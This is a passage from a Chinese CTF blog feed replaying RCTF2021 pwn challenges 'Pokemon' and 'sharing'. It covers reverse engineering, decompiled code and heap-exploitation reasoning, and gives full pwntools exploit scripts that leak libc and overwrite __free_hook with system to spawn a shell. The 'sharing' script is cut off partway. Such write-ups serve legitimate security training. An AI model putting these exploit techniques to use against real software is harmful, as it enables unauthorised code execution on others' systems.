    <category term="比赛wp" scheme="https://cv196082.gitee.io/categories/%E6%AF%94%E8%B5%9Bwp/"/>
    
    
    <category term="house of pig" scheme="https://cv196082.gitee.io/tags/house-of-pig/"/>
    
    <category term="HeapFengShui" scheme="https://cv196082.gitee.io/tags/HeapFengShui/"/>
    
  </entry>
  
  <entry>
    <title>RCTF2021复现</title>
    <link href="https://cv196082.gitee.io/2022/04/10/RCTF2021%E5%A4%8D%E7%8E%B0/"/>
    <id>https://cv196082.gitee.io/2022/04/10/RCTF2021%E5%A4%8D%E7%8E%B0/</id>
    <published>2022-04-10T09:14:14.000Z</published>
    <updated>2022-04-14T11:48:01.246Z</updated>
    
    <content type="html"><![CDATA[<p>以前做pwn题比较在意的是利用方式以及利用原理，很少静下心来去逆向一个程序，也就导致我现在逆向能力相对来说很差，在遇到RCTF这种题目极其复杂的内容我可能就直接放弃了，然后比赛完就看别人wp，别人说了流程之后我就会想，这么简单我为什么当时不做呢？所以现在打算多多练题训练自己的逆向能力。</p><h2 id="Pokemon"><a href="#Pokemon" class="headerlink" title="Pokemon"></a>Pokemon</h2><h3 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h3><p>main函数存在三个选项，第一就是创建chunk，创建的方式分为三种</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct <span class="title">chunk</span><span class="params">(Gold <span class="number">3</span>)</span>0x1D0:</span>&#123;</span><br><span class="line"><span class="number">888</span>~<span class="number">908</span></span><br><span class="line"><span class="number">400</span>~<span class="number">420</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function">struct <span class="title">chunk</span><span class="params">(Silver <span class="number">2</span>)</span>0x210:</span>&#123;</span><br><span class="line"><span class="number">666</span>~<span class="number">676</span></span><br><span class="line"><span class="number">200</span>~<span class="number">210</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function">struct <span class="title">chunk</span><span class="params">(Bronze <span class="number">1</span>)</span>0x7f~0x380:</span>&#123;</span><br><span class="line"><span class="number">23</span>~<span class="number">23</span>+(size/<span class="number">16</span>)</span><br><span class="line">chunk_addr</span><br><span class="line">passwd</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这是我推测出来的三个结构体。</p><p>第二个选项就是对chunk进行一些行为，又分为三个，第一是释放chunk但是只允许类型为1的chunk被释放，第二个是show但是有一定的限制</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( <span class="built_in">memchr</span>((a1 + <span class="number">16</span>), <span class="number">0x7F</span>, <span class="number">8uLL</span>)</span><br><span class="line">    || <span class="built_in">memchr</span>((a1 + <span class="number">16</span>), <span class="number">0x7E</span>, <span class="number">8uLL</span>)</span><br><span class="line">    || <span class="built_in">strchr</span>((a1 + <span class="number">16</span>), <span class="number">0x55</span>)</span><br><span class="line">    || <span class="built_in">strchr</span>((a1 + <span class="number">16</span>), <span class="number">0x56</span>) )</span><br></pre></td></tr></table></figure><p>第三个选项就是修改内容，但是只可以修改一次并且类型1不能修改，类型2每个0x10才能修改，但是存在堆溢出，类型3可以修改0x10之后的内容大小为0x20</p><p>然后就是main当中的第三个选项，这里首先就是比较你的两个chunk的值与Mewtwo作比较</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Mewtwo</span>:</span>&#123;</span><br><span class="line"><span class="number">99999999</span></span><br><span class="line"><span class="number">6666666</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果小于则会直接推出，如果大于就会进入下面</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_3892</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt; <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *(a1 + <span class="number">4</span> * (i + <span class="number">16LL</span>) + <span class="number">8</span>) == <span class="number">1</span> &amp;&amp; *(*(a1 + <span class="number">8</span> * (i + <span class="number">6LL</span>) + <span class="number">8</span>) + <span class="number">0x10</span>LL) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !dword_81F8 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Please remember the password of the evolutionary gem: &quot;</span>);</span><br><span class="line">    write(<span class="number">1</span>, (*(a1 + <span class="number">8</span> * (i + <span class="number">6LL</span>) + <span class="number">8</span>) + <span class="number">0x10</span>LL), <span class="number">8uLL</span>);</span><br><span class="line">    write(<span class="number">1</span>, <span class="string">&quot;\n&quot;</span>, <span class="number">1uLL</span>);</span><br><span class="line">    dword_81F8 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>没有限制条件的write</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> __fastcall <span class="title">sub_396E</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">ssize_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> j; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">1</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = *(a1 + <span class="number">4</span> * (i + <span class="number">16LL</span>) + <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> ( result == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      result = *(*(a1 + <span class="number">8</span> * (i + <span class="number">6LL</span>) + <span class="number">8</span>) + <span class="number">16LL</span>);</span><br><span class="line">      <span class="keyword">if</span> ( result )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Please give the evolution password: &quot;</span>);</span><br><span class="line">        result = read(<span class="number">0</span>, *(*(a1 + <span class="number">8</span> * (i + <span class="number">6LL</span>) + <span class="number">8</span>) + <span class="number">0x18</span>LL), <span class="number">0x30</span>uLL);</span><br><span class="line">        <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">0x2F</span>; ++j )</span><br><span class="line">        &#123;</span><br><span class="line">          result = *(*(a1 + <span class="number">8</span> * (i + <span class="number">6LL</span>) + <span class="number">8</span>) + <span class="number">0x18</span>LL) + j;</span><br><span class="line">          *result ^= *(*(a1 + <span class="number">8</span> * (i + <span class="number">6LL</span>) + <span class="number">8</span>) + j % <span class="number">8</span> + <span class="number">0x10</span>LL);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以及一个写入，这个写入是往chunk的0x18上的地址的值来写入。</p><p>然后这里的free是存在一个小东西，就是如果chunk的0x10位置和0x18位置存在值就会free掉0x18位置的值。</p><p>然后这里把游戏角色的结构体贴出来</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">role</span>:</span>&#123;</span><br><span class="line">name;</span><br><span class="line"><span class="number">0x20</span>*(chunk+<span class="number">8</span>)+=<span class="number">1000</span>;</span><br><span class="line"><span class="number">0x28</span>*(chunk)+=<span class="number">0</span>;</span><br><span class="line"><span class="number">0x30</span>remaining=<span class="number">1666</span>;</span><br><span class="line"><span class="number">0x34</span>count;</span><br><span class="line"><span class="number">0x38</span>chunk;</span><br><span class="line"><span class="number">0x48</span>exists/category;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h3><p>其实这道题就算是逆向完了也有点儿难想到利用方式，这里很烦的一点就是我们可以控制的内容太少了，但是由于题目给的read的地方都不能修改掉fd和bk那就肯定是存在overlapping，加上存在堆溢出可以很容易想到改变堆的大小，形成UAF。</p><p><strong>然后这里需要注意的一点就是当malloc的size大于small bin中的size且小于small bin当中的size+0x10就不会进行切块</strong></p><p>但是我觉得这应该不只是small bin当中的机制(我看源码只看了small bin的request所以其他的我也不确定)，后面有时间会试试在unsorted bin和large bin中是否成立。</p><p>其实知道了这个知识点就很好利用了，因为如果按照固定思维的我们堆溢出无法修改掉size位，但是如果存在以上机制我们即可利用0x220来修改掉后面chunk的size了。</p><h4 id="综上，exp"><a href="#综上，exp" class="headerlink" title="综上，exp"></a>综上，exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./Pokemon&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./Pokemon&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">category, size=<span class="number">0</span>, idx=<span class="number">0</span></span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Choice:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Choice:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(category), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> category == <span class="number">1</span>:</span><br><span class="line">        r.recvuntil(<span class="string">b&#x27;You will get a Pikachu. How big do you want it to be?&#x27;</span>)</span><br><span class="line">        r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(size), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;]&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(idx), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx, need=<span class="literal">False</span></span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Choice:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;]&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(idx), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Choice:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> need:</span><br><span class="line">        r.recvuntil(</span><br><span class="line">            <span class="string">b&#x27;This Pokemon is very valuable. Are you sure you want to release it? [Y/N]&#x27;</span></span><br><span class="line">        )</span><br><span class="line">        r.sendline(<span class="string">b&#x27;Y&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, content</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Choice:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;]&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(idx), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Choice:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;You say: &#x27;</span>)</span><br><span class="line">    r.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span>(<span class="params">payload, key</span>):</span></span><br><span class="line">    res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(payload)):</span><br><span class="line">        res += <span class="built_in">chr</span>(payload[i] ^ key[i % <span class="number">8</span>])</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">ord</span>(res[<span class="built_in">len</span>(res) - <span class="number">1</span>])))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(res, encoding=<span class="string">&#x27;ISO-8859-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Welcome to the Pokemon world, input your name: &#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;196082&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    create(<span class="number">1</span>, <span class="number">0x220</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    create(<span class="number">1</span>, <span class="number">0x300</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    create(<span class="number">1</span>, <span class="number">0x310</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">create(<span class="number">1</span>, <span class="number">0x220</span>)</span><br><span class="line">create(<span class="number">1</span>, <span class="number">0x300</span>, <span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">create(<span class="number">1</span>, <span class="number">0x300</span>)</span><br><span class="line">create(<span class="number">1</span>, <span class="number">0x300</span>)</span><br><span class="line">create(<span class="number">1</span>, <span class="number">0x300</span>)</span><br><span class="line">create(<span class="number">1</span>, <span class="number">0x300</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">create(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">0</span>, p64(<span class="number">0xdeadbeef</span>) * <span class="number">16</span> * <span class="number">2</span> + p64(<span class="number">0</span>) + p64(<span class="number">0xc40</span> + <span class="number">1</span>))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>, <span class="literal">True</span>)</span><br><span class="line">create(<span class="number">1</span>, <span class="number">0x300</span>)</span><br><span class="line">create(<span class="number">1</span>, <span class="number">0x300</span>, <span class="number">1</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Choice:&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;]&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">create(<span class="number">1</span>, <span class="number">0x310</span>, <span class="number">1</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Choice:&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;gem: &#x27;</span>)</span><br><span class="line">main_arena_96 = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(main_arena_96))</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;[Y/N]&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;N&#x27;</span>)</span><br><span class="line">malloc_hook = (main_arena_96 &amp; <span class="number">0xFFFFFFFFFFFFF000</span>) + \</span><br><span class="line">    (libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>] &amp; <span class="number">0xfff</span>)</span><br><span class="line">libc_base = malloc_hook - libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">1</span>, <span class="number">0x300</span>, <span class="number">0</span>)</span><br><span class="line">create(<span class="number">3</span>, idx=<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>,</span><br><span class="line">     p8(<span class="number">0xaa</span>) * <span class="number">8</span> + p64(libc_base + libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>] - <span class="number">8</span>) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Choice:&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;[Y/N]&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;Y&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Please give the evolution password: &#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">b&#x27;/bin/sh\x00&#x27;</span> + p64(libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">r.send(</span><br><span class="line">    xor(<span class="string">b&#x27;/bin/sh\x00&#x27;</span> + p64(libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]),</span><br><span class="line">        p8(<span class="number">0xaa</span>) * <span class="number">8</span>))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="sharing"><a href="#sharing" class="headerlink" title="sharing"></a>sharing</h2><p>相较于上一道题，这道题的难度可以说是十分简单，但是很烦的一点就是这道题目使用cpp写的，我对于cpp的逆向一直都不知道怎么入手，所以去问了大师傅，大师傅说<strong>对于cpp的逆向先是用ida搞清楚基本的功能，程序的特性利用动态调试来挖掘</strong>不过愚钝的我也不明白这道题到底是怎么想到create的idx相同时会free掉当前idx已存在的chunk，可能这就是经验积累吧。</p><p>这道题知道了这样会free的话就很好做了这里就只贴exp了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./sharing&#x27;</span>)</span><br><span class="line">r = process(<span class="string">&#x27;./sharing&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">idx, size</span>):</span></span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Choice: &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Idx: &#x27;</span>, <span class="built_in">bytes</span>(<span class="built_in">str</span>(idx), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Sz: &#x27;</span>, <span class="built_in">bytes</span>(<span class="built_in">str</span>(size), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">move</span>(<span class="params">from_idx, to_idx</span>):</span></span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Choice: &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;From: &#x27;</span>, <span class="built_in">bytes</span>(<span class="built_in">str</span>(from_idx), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;To: &#x27;</span>, <span class="built_in">bytes</span>(<span class="built_in">str</span>(to_idx), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Choice: &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Idx: &#x27;</span>, <span class="built_in">bytes</span>(<span class="built_in">str</span>(idx), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, content</span>):</span></span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Choice: &#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Idx: &#x27;</span>, <span class="built_in">bytes</span>(<span class="built_in">str</span>(idx), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line">    r.sendafter(<span class="string">b&#x27;Content: &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hint</span>(<span class="params">addr</span>):</span></span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Choice: &#x27;</span>, <span class="built_in">bytes</span>(<span class="built_in">str</span>(<span class="number">0xdead</span>), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Hint: &#x27;</span>, p32(<span class="number">0x2F767991</span>) + p32(<span class="number">0</span>) * <span class="number">3</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Addr: &#x27;</span>, <span class="built_in">bytes</span>(<span class="built_in">str</span>(addr), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create(<span class="number">0</span>, <span class="number">0x500</span>)</span><br><span class="line">create(<span class="number">1</span>, <span class="number">0x500</span>)</span><br><span class="line">create(<span class="number">0</span>, <span class="number">0x510</span>)</span><br><span class="line">create(<span class="number">2</span>, <span class="number">0x500</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">main_arena_96 = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(main_arena_96))</span><br><span class="line">malloc_hook = (main_arena_96 &amp; <span class="number">0xFFFFFFFFFFFFF000</span>) + \</span><br><span class="line">    (libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>] &amp; <span class="number">0xfff</span>)</span><br><span class="line">libc_base = malloc_hook - libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">create(<span class="number">3</span>, <span class="number">0x80</span>)</span><br><span class="line">create(<span class="number">4</span>, <span class="number">0x80</span>)</span><br><span class="line">create(<span class="number">3</span>, <span class="number">0x90</span>)</span><br><span class="line">create(<span class="number">4</span>, <span class="number">0x90</span>)</span><br><span class="line">create(<span 